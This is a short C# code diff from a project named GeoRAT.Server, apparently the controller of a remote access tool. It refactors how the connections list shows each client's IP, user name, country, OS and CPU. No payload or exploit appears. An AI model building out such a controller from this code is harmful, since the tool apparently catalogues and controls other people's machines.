@@ -95,14 +95,16 @@ namespace GeoRAT.Server
                     }
 
                     //add data to listview including flag 
-                    ListViewItem item = new ListViewItem();
-                    item.Tag = received;
-                    item.Text = ip[0];
+                    var item = new ListViewItem
+                    {
+                        Tag = received,
+                        Text = ip[0]
+                    };
                     item.SubItems.Add(data.UserName);
                     item.ImageIndex = index;
                     item.SubItems.Add(data.Country);
-                    item.SubItems.Add(data.OS);
-                    item.SubItems.Add(data.CPU);
+                    item.SubItems.Add(data.Os);
+                    item.SubItems.Add(data.Cpu);
                     lvConnections.Items.Add(item);
                     
 
